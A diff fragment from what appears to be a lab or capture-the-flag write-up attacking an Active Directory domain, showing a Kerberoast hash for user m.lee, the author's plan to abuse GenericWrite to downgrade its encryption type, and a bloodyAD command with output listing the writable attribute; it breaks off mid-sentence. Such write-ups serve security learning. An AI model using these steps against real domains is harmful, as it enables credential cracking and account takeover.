@@ -530,5 +530,12 @@ LDAP        10.0.0.100      389    DC               $krb5tgs$18$m.lee$NOVAFORGE.
 But the hash for `m.lee` is using a string encrpytion type, but since i have GenericWrite i should have the permission to downgrade the encrpytion type!
 
 ```python
+bloodyAD --host dc.novaforge.local -d novaforge.local -k get writable --detail
 
+...[SNIP]...
+
+distinguishedName: CN=m.lee,CN=Users,DC=novaforge,DC=local
+msDS-SupportedEncryptionTypes: WRITE
 ```
+
+As seen here i
